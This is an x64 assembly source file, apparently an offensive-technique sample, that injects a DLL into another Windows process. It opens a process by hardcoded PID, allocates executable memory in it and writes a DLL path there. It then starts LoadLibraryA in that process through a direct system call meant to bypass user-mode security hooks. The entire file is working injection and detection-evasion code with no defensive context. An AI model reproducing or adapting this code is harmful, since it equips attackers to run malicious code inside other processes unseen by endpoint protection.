; windows_injection_directsyscall.asm

extrn ExitProcess :PROC
extrn OpenProcess :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn GetModuleHandleA :PROC
extrn GetProcAddress :PROC
extrn CreateRemoteThread :PROC

.data 
    dllPath                     DB "C:\Users\User\Desktop\windows_create_dll_64.dll", 0
    sKrnl32                     DB "kernel32.dll", 0
    sLoadLib                    DB "LoadLibraryA", 0
    PID                         DQ 5096

    hProcess                    DQ ?
    nSizeDLL                    DQ ?
    baseAddr                    DQ ?
    hKrnl32Addr                 DQ ?
    hLoadLibAddr                DQ ?
    hThread                     DQ ?

.code
Start PROC
    SUB     rsp, 28h

    ; OpenProcess()
    MOV     rcx, 1F0FFFh
    XOR     rdx, rdx
    MOV     r8, PID
    CALL    OpenProcess
    CMP     rax, 0
    JZ      _exit
    MOV     [hProcess], rax

    ; VirtualAllocEx()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, SIZEOF dllPath
    MOV     r9, 3000h
    MOV     qword ptr [rsp+32], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit
    MOV     baseAddr, rax

    ; WriteProcessMemory()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, dllPath
    MOV     r9, SIZEOF dllPath
    XOR     rax, rax
    MOV     qword ptr [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

    ; GetModulehandle()
    LEA     rcx, sKrnl32
    CALL    GetModuleHandleA
    CMP     rax, 0
    JZ      _exit
    MOV     hKrnl32Addr, rax

    ; GetProcAddress()
    MOV     rcx, hKrnl32Addr
    LEA     rdx, sLoadLib
    CALL    GetProcAddress
    CMP     rax, 0
    JZ      _exit
    MOV     hLoadLibAddr, rax

    ; Direct Syscall
    SUB     rsp, 58h
    LEA     rcx, hThread
    MOV     rdx, 1FFFFFh
    XOR     r8, r8
    MOV     r9, hProcess
    XOR     rax, rax
    MOV     qword ptr [rsp+50h], rax
    MOV     qword ptr [rsp+48h], rax
    MOV     qword ptr [rsp+40h], rax
    MOV     qword ptr [rsp+38h], rax
    MOV     qword ptr [rsp+30h], rax
    MOV     rax, baseAddr
    MOV     qword ptr [rsp+28h], rax
    MOV     rax, hLoadLibAddr
    MOV     qword ptr [rsp+20h], rax
    CALL    DirectSyscall
    ADD     rsp, 58h

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess
Start ENDP

DirectSyscall PROC
    MOV     r10, rcx
    MOV     eax, 0C5h
    SYSCALL
    RET
DirectSyscall ENDP

END
